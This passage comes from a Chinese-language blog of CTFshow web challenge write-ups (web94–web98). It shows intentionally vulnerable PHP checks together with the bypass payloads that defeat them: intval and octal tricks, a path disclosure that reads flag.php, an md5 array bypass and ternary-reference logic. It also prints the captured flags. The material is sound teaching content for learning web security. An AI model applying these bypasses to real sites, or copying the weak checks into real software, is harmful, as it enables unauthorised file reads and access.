<span class="line"><span style="color:#d4d4d4">}</span></span></code></pre></div></div></figure><p>payload:</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">?num=</span><span style="color:#b5cea8">4476.3</span></span></code></pre></div></div></figure><p>flag:</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">ctfshow{</span><span style="color:#b5cea8">681611</span><span style="color:#d4d4d4">f8-e9c3-</span><span style="color:#b5cea8">4</span><span style="color:#d4d4d4">b1e-b149-fe1936e7ff60}</span></span></code></pre></div></div></figure><h3 id="web94intval小数点截断"><a class="markdownIt-Anchor" href="#web94intval小数点截断"></a> web94	(intval 小数点截断)</h3><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4"> &lt;?php</span></span>
<span class="line"></span>
<span class="line"><span style="color:#6a9955"># -*- coding: utf-8 -*-</span></span>
<span class="line"></span>
<span class="line"><span style="color:#c586c0">include</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">"flag.php"</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#dcdcaa">highlight_file</span><span style="color:#d4d4d4">(</span><span style="color:#569cd6">__FILE__</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">isset</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'num'</span><span style="color:#d4d4d4">])){</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#9cdcfe">$num</span><span style="color:#d4d4d4"> = </span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'num'</span><span style="color:#d4d4d4">];</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$num</span><span style="color:#d4d4d4">===</span><span style="color:#ce9178">"4476"</span><span style="color:#d4d4d4">){</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#c586c0">die</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">"no no no!"</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">    }</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">preg_match</span><span style="color:#d4d4d4">(</span><span style="color:#d16969">"/[a-z]/i"</span><span style="color:#d4d4d4">, </span><span style="color:#9cdcfe">$num</span><span style="color:#d4d4d4">)){</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#c586c0">die</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">"no no no!"</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">    }</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(!</span><span style="color:#dcdcaa">strpos</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$num</span><span style="color:#d4d4d4">, </span><span style="color:#ce9178">"0"</span><span style="color:#d4d4d4">)){</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#c586c0">die</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">"no no no!"</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">    }</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">intval</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$num</span><span style="color:#d4d4d4">,</span><span style="color:#b5cea8">0</span><span style="color:#d4d4d4">)===</span><span style="color:#b5cea8">4476</span><span style="color:#d4d4d4">){</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#dcdcaa">echo</span><span style="color:#d4d4d4"> </span><span style="color:#9cdcfe">$flag</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">    }</span></span>
<span class="line"><span style="color:#d4d4d4">}</span></span></code></pre></div></div></figure><p>这里要注意一下这个 strpos ($a,b) 函数，这个函数是查找 b 在字符串中第一次出现的位置</p><figure class="shiki"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">语法：strpos(string,find,start)</span></span>
<span class="line"><span style="color:#d4d4d4">string是必需的，被搜索的字符串</span></span>
<span class="line"><span style="color:#d4d4d4">find必需，规定目标字符串</span></span>
<span class="line"><span style="color:#d4d4d4">start可选，规定在何处开始</span></span>
<span class="line"><span style="color:#d4d4d4">注意：strpos对大小写敏感</span></span></code></pre></div></div></figure><blockquote><p>其他相关函数还有：</p><ul><li><a target="_blank" rel="noopener" href="https://www.w3school.com.cn/php/func_string_stripos.asp">stripos()</a> - 查找字符串在另一字符串中第一次出现的位置（不区分大小写）</li><li><a target="_blank" rel="noopener" href="https://www.w3school.com.cn/php/func_string_strripos.asp">strripos()</a> - 查找字符串在另一字符串中最后一次出现的位置（不区分大小写）</li><li><a target="_blank" rel="noopener" href="https://www.w3school.com.cn/php/func_string_strrpos.asp">strrpos()</a> - 查找字符串在另一字符串中最后一次出现的位置（区分大小写）</li></ul></blockquote><p>于是构造 payload：</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">?num=</span><span style="color:#b5cea8">4476.0</span></span></code></pre></div></div></figure><p>flag：</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">ctfshow{b2949faa-</span><span style="color:#b5cea8">0e74</span><span style="color:#d4d4d4">-</span><span style="color:#b5cea8">4e56</span><span style="color:#d4d4d4">-</span><span style="color:#b5cea8">8</span><span style="color:#d4d4d4">cce-</span><span style="color:#b5cea8">8</span><span style="color:#d4d4d4">b81d18cd6ff}</span></span></code></pre></div></div></figure><h3 id="web95弱比较进制转换"><a class="markdownIt-Anchor" href="#web95弱比较进制转换"></a> web95	(弱比较 + 进制转换)</h3><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4"> &lt;?php</span></span>
<span class="line"></span>
<span class="line"><span style="color:#6a9955"># -*- coding: utf-8 -*-</span></span>
<span class="line"></span>
<span class="line"><span style="color:#c586c0">include</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">"flag.php"</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#dcdcaa">highlight_file</span><span style="color:#d4d4d4">(</span><span style="color:#569cd6">__FILE__</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">isset</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'num'</span><span style="color:#d4d4d4">])){</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#9cdcfe">$num</span><span style="color:#d4d4d4"> = </span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'num'</span><span style="color:#d4d4d4">];</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$num</span><span style="color:#d4d4d4">==</span><span style="color:#b5cea8">4476</span><span style="color:#d4d4d4">){</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#c586c0">die</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">"no no no!"</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">    }</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">preg_match</span><span style="color:#d4d4d4">(</span><span style="color:#d16969">"/[a-z]|</span><span style="color:#d7ba7d">\.</span><span style="color:#d16969">/i"</span><span style="color:#d4d4d4">, </span><span style="color:#9cdcfe">$num</span><span style="color:#d4d4d4">)){</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#c586c0">die</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">"no no no!!"</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">    }</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(!</span><span style="color:#dcdcaa">strpos</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$num</span><span style="color:#d4d4d4">, </span><span style="color:#ce9178">"0"</span><span style="color:#d4d4d4">)){</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#c586c0">die</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">"no no no!!!"</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">    }</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">intval</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$num</span><span style="color:#d4d4d4">,</span><span style="color:#b5cea8">0</span><span style="color:#d4d4d4">)===</span><span style="color:#b5cea8">4476</span><span style="color:#d4d4d4">){</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#dcdcaa">echo</span><span style="color:#d4d4d4"> </span><span style="color:#9cdcfe">$flag</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">    }</span></span>
<span class="line"><span style="color:#d4d4d4">}</span></span></code></pre></div></div></figure><p>这里过滤了字母，也转义过滤了小数点</p><p>payload：</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">?num=+</span><span style="color:#b5cea8">010574</span></span>
<span class="line"><span style="color:#6a9955"># 空格也可以</span></span></code></pre></div></div></figure><p>这里改成 10574 是八进制的 4476，第一层过滤会认为这个是十进制从而不等于 4476，第二层过滤也很轻松突破，第三层过滤我有点疑惑其实：</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">&lt;?php</span></span>
<span class="line"></span>
<span class="line"><span style="color:#6a9955"># -*- coding: utf-8 -*-</span></span>
<span class="line"><span style="color:#9cdcfe">$num</span><span style="color:#d4d4d4"> = +</span><span style="color:#b5cea8">010574</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">strpos</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$num</span><span style="color:#d4d4d4">, </span><span style="color:#ce9178">"0"</span><span style="color:#d4d4d4">)){</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#dcdcaa">echo</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">"got it!"</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">}</span></span>
<span class="line"><span style="color:#c586c0">else</span><span style="color:#d4d4d4">{</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#dcdcaa">echo</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">"long way to go, boy~"</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">}</span></span>
<span class="line"><span style="color:#dcdcaa">echo</span><span style="color:#d4d4d4"> </span><span style="color:#dcdcaa">intval</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$num</span><span style="color:#d4d4d4">, </span><span style="color:#b5cea8">0</span><span style="color:#d4d4d4">);</span></span></code></pre></div></div></figure><p>这里测试了<span class="katex-error" title="ParseError: KaTeX parse error: LaTeX-incompatible input and strict mode is set to 'error': Unicode text character &quot;和&quot; used in math mode [unicodeTextInMathMode] at position 11: num=010574和̲"> num=010574 和</span> num=+010574 的区别，只有后者能被查找到 "0"，前者确实不能被查找到 "0"，观察输出我发现，如果不带 + 或者空格的话，num 就直接被解析成 4476，从而导致 strpos 不能查找到，加上之后整体数据变成了字符串。而被加上这个字符之后（其实 + 被提交过去也是解析成空格）intval 会将其删除进行取整。</p><p>flag：</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">ctfshow{</span><span style="color:#b5cea8">3517</span><span style="color:#d4d4d4">fa1b-</span><span style="color:#b5cea8">7936</span><span style="color:#d4d4d4">-</span><span style="color:#b5cea8">428</span><span style="color:#d4d4d4">b-</span><span style="color:#b5cea8">80</span><span style="color:#d4d4d4">f0-</span><span style="color:#b5cea8">7</span><span style="color:#d4d4d4">ccd84b18f87}</span></span></code></pre></div></div></figure><h3 id="web96报错回显传参路径"><a class="markdownIt-Anchor" href="#web96报错回显传参路径"></a> web96	(报错回显传参路径)</h3><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4"> &lt;?php</span></span>
<span class="line"></span>
<span class="line"><span style="color:#6a9955"># -*- coding: utf-8 -*-</span></span>
<span class="line"></span>
<span class="line"><span style="color:#dcdcaa">highlight_file</span><span style="color:#d4d4d4">(</span><span style="color:#569cd6">__FILE__</span><span style="color:#d4d4d4">);</span></span>
<span class="line"></span>
<span class="line"><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">isset</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'u'</span><span style="color:#d4d4d4">])){</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'u'</span><span style="color:#d4d4d4">]==</span><span style="color:#ce9178">'flag.php'</span><span style="color:#d4d4d4">){</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#c586c0">die</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">"no no no"</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">    }</span><span style="color:#c586c0">else</span><span style="color:#d4d4d4">{</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#dcdcaa">highlight_file</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'u'</span><span style="color:#d4d4d4">]);</span></span>
<span class="line"><span style="color:#d4d4d4">    }</span></span>
<span class="line"></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">}</span></span></code></pre></div></div></figure><p>因为这里只是一个弱比较比对值是否等于 flag.php 而不是一个正则匹配，于是我们可以随便写一个文件名字，得到报错回显，将路径复制构造 payload：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202211222152597.png" srcset="/img/loading/loading.gif" lazyload alt="image-20221115133557605"></p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">?u=/</span><span style="color:#569cd6">var</span><span style="color:#d4d4d4">/www/html/flag</span><span style="color:#d4d4d4">.</span><span style="color:#d4d4d4">php</span></span></code></pre></div></div></figure><p>于是得到 flag：</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">ctfshow{c81434bf-</span><span style="color:#b5cea8">44</span><span style="color:#d4d4d4">dd-</span><span style="color:#b5cea8">47</span><span style="color:#d4d4d4">a0-</span><span style="color:#b5cea8">9</span><span style="color:#d4d4d4">c9a-b75333ba52c4}</span></span></code></pre></div></div></figure><h3 id="web97md5数组绕过"><a class="markdownIt-Anchor" href="#web97md5数组绕过"></a> web97	(md5 数组绕过)</h3><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4"> &lt;?php</span></span>
<span class="line"></span>
<span class="line"><span style="color:#6a9955"># -*- coding: utf-8 -*-</span></span>
<span class="line"></span>
<span class="line"><span style="color:#c586c0">include</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">"flag.php"</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#dcdcaa">highlight_file</span><span style="color:#d4d4d4">(</span><span style="color:#569cd6">__FILE__</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#c586c0">if</span><span style="color:#d4d4d4"> (</span><span style="color:#dcdcaa">isset</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$_POST</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'a'</span><span style="color:#d4d4d4">]) and </span><span style="color:#dcdcaa">isset</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$_POST</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'b'</span><span style="color:#d4d4d4">])) {</span></span>
<span class="line"><span style="color:#c586c0">if</span><span style="color:#d4d4d4"> (</span><span style="color:#9cdcfe">$_POST</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'a'</span><span style="color:#d4d4d4">] != </span><span style="color:#9cdcfe">$_POST</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'b'</span><span style="color:#d4d4d4">])</span></span>
<span class="line"><span style="color:#c586c0">if</span><span style="color:#d4d4d4"> (</span><span style="color:#dcdcaa">md5</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$_POST</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'a'</span><span style="color:#d4d4d4">]) === </span><span style="color:#dcdcaa">md5</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$_POST</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'b'</span><span style="color:#d4d4d4">]))</span></span>
<span class="line"><span style="color:#dcdcaa">echo</span><span style="color:#d4d4d4"> </span><span style="color:#9cdcfe">$flag</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#c586c0">else</span></span>
<span class="line"><span style="color:#dcdcaa">print</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">'Wrong.'</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">}</span></span>
<span class="line"><span style="color:#d4d4d4">?&gt;</span></span></code></pre></div></div></figure><p>很经典的一个前不等 md5 再等（注意这里是强比较），payload：</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">a[]=</span><span style="color:#b5cea8">1</span><span style="color:#569cd6">&amp;</span><span style="color:#d4d4d4">b[]=</span><span style="color:#b5cea8">9</span></span></code></pre></div></div></figure><p>flag：</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">ctfshow{</span><span style="color:#b5cea8">28e448</span><span style="color:#d4d4d4">bd-ed0c-</span><span style="color:#b5cea8">4967</span><span style="color:#d4d4d4">-</span><span style="color:#b5cea8">9e02</span><span style="color:#d4d4d4">-</span><span style="color:#b5cea8">683137313e70</span><span style="color:#d4d4d4">}</span></span></code></pre></div></div></figure><h3 id="web98三元运算符理解"><a class="markdownIt-Anchor" href="#web98三元运算符理解"></a> web98	(? 三元运算符理解)</h3><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"></span>
<span class="line"><span style="color:#d4d4d4">Notice: Undefined index: flag in /</span><span style="color:#569cd6">var</span><span style="color:#d4d4d4">/www/html/index</span><span style="color:#d4d4d4">.</span><span style="color:#d4d4d4">php </span><span style="color:#569cd6">on</span><span style="color:#d4d4d4"> line </span><span style="color:#b5cea8">15</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">Notice: Undefined index: flag in /</span><span style="color:#569cd6">var</span><span style="color:#d4d4d4">/www/html/index</span><span style="color:#d4d4d4">.</span><span style="color:#d4d4d4">php </span><span style="color:#569cd6">on</span><span style="color:#d4d4d4"> line </span><span style="color:#b5cea8">16</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">Notice: Undefined index: HTTP_FLAG in /</span><span style="color:#569cd6">var</span><span style="color:#d4d4d4">/www/html/index</span><span style="color:#d4d4d4">.</span><span style="color:#d4d4d4">php </span><span style="color:#569cd6">on</span><span style="color:#d4d4d4"> line </span><span style="color:#b5cea8">17</span></span>
<span class="line"><span style="color:#d4d4d4">&lt;?php</span></span>
<span class="line"></span>
<span class="line"><span style="color:#6a9955"># -*- coding: utf-8 -*-</span></span>
<span class="line"></span>
<span class="line"><span style="color:#c586c0">include</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">"flag.php"</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">?</span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">=</span><span style="color:#569cd6">&amp;</span><span style="color:#9cdcfe">$_POST</span><span style="color:#d4d4d4">:</span><span style="color:#ce9178">'flag'</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'flag'</span><span style="color:#d4d4d4">]==</span><span style="color:#ce9178">'flag'</span><span style="color:#d4d4d4">?</span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">=</span><span style="color:#569cd6">&amp;</span><span style="color:#9cdcfe">$_COOKIE</span><span style="color:#d4d4d4">:</span><span style="color:#ce9178">'flag'</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'flag'</span><span style="color:#d4d4d4">]==</span><span style="color:#ce9178">'flag'</span><span style="color:#d4d4d4">?</span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">=</span><span style="color:#569cd6">&amp;</span><span style="color:#9cdcfe">$_SERVER</span><span style="color:#d4d4d4">:</span><span style="color:#ce9178">'flag'</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#dcdcaa">highlight_file</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'HTTP_FLAG'</span><span style="color:#d4d4d4">]==</span><span style="color:#ce9178">'flag'</span><span style="color:#d4d4d4">?</span><span style="color:#9cdcfe">$flag</span><span style="color:#d4d4d4">:</span><span style="color:#569cd6">__FILE__</span><span style="color:#d4d4d4">);</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">?&gt;</span></span></code></pre></div></div></figure><p>这里考三元符运算 bool?true:false</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">首先判断逻辑，记第一行为文件包含。</span></span>
<span class="line"><span style="color:#d4d4d4">第二行如果</span><span style="color:#9cdcfe">$_GET存在，则执行$_GET被引用赋值$_POST</span><span style="color:#d4d4d4">，若不存在则式子为</span><span style="color:#ce9178">'flag'</span><span style="color:#d4d4d4">。被赋值为flag这样一来get是没有flag下标的，导致后面两行判断不会成立，get值还是flag，但没有下标，这个时候也就没有</span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'HTTP_FLAG'</span><span style="color:#d4d4d4">]==</span><span style="color:#ce9178">'flag'</span><span style="color:#d4d4d4">的可能了。</span></span>
<span class="line"><span style="color:#d4d4d4">    </span></span>
<span class="line"><span style="color:#d4d4d4">所以get传参是必需的。（以下探讨均为get存在情况）</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">get传参存在，此时get将会被引用赋值，变成post，post传参决定下标也决定值。</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#b5cea8">1.</span><span style="color:#d4d4d4">如果post传flag=</span><span style="color:#dcdcaa">x</span><span style="color:#d4d4d4">(x为不等于flag的其他字符串)，此时下标满足flag，但是值并不满足，第三行判断不成立，则post被赋值为flag，这个时候下标满足且值也因此满足第四行</span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'flag'</span><span style="color:#d4d4d4">]==</span><span style="color:#ce9178">'flag'</span><span style="color:#d4d4d4">?</span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">=</span><span style="color:#569cd6">&amp;</span><span style="color:#9cdcfe">$_SERVER</span><span style="color:#d4d4d4">:</span><span style="color:#ce9178">'flag'</span><span style="color:#d4d4d4">判断。满足第四行判断之后，则get被引用赋值</span><span style="color:#9cdcfe">$_SERVER</span><span style="color:#d4d4d4">，而这个变量事不可控的，是由服务器生成的，很难突破最后的判断拿到flag，故舍弃。</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#b5cea8">2.</span><span style="color:#d4d4d4">如果post传flag=</span><span style="color:#dcdcaa">flag，此时下标和值均满足第三行判断，则get再次被cookie赋值</span><span style="color:#d4d4d4">(覆盖赋值)。这里又有分支：</span></span>
<span class="line"><span style="color:#d4d4d4">    	(</span><span style="color:#b5cea8">1</span><span style="color:#d4d4d4">)如果cookie为空，则get变空，无下标无值，所有条件都不成立，所以cookie在这种情况下也是必需的。</span></span>
<span class="line"><span style="color:#d4d4d4">    	(</span><span style="color:#b5cea8">2</span><span style="color:#d4d4d4">)如果cookie不为空，则根据最后一条判断综合分析，我们应该要使第四行判断不成立，cookie可以写为：</span></span>
<span class="line"><span style="color:#d4d4d4">    		HTTP_FLAG：flag	此时不满足第四行判断但满足最后判断，可以拿到flag。</span></span>
<span class="line"><span style="color:#d4d4d4">    </span></span>
<span class="line"><span style="color:#d4d4d4">于是得到解题步骤：</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#b5cea8">1.</span><span style="color:#d4d4d4">传get参数，可任意，如a=a</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#b5cea8">2.</span><span style="color:#d4d4d4">传post参数，flag=flag</span></span>
